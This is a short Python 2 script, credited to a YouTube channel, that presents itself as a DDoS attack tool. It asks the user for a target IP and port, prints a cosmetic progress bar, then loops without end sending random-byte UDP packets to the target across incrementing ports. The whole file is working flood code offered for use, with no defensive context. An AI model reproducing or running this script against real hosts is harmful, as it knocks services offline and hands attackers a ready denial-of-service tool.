import sys
import os
import time
import socket
import random

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HardMods"
print "You Tube : https://www.youtube.com/c/HardModsOficial"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[□□□□□□] 0% "
time.sleep(1)
print "[□□□□□□□] 5% "
time.sleep(1)
print "[■■□□□□□□] 10% "
time.sleep(1)
print "[■■■□□□□□□] 25%"
time.sleep(1)
print "[■■■■■□□□□□] 50%"
time.sleep(1)
print "[■■■■■■□□□□□] 75%"
time.sleep(1)
print "[■■■■■■■■■■■■] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 100000:
       port = 1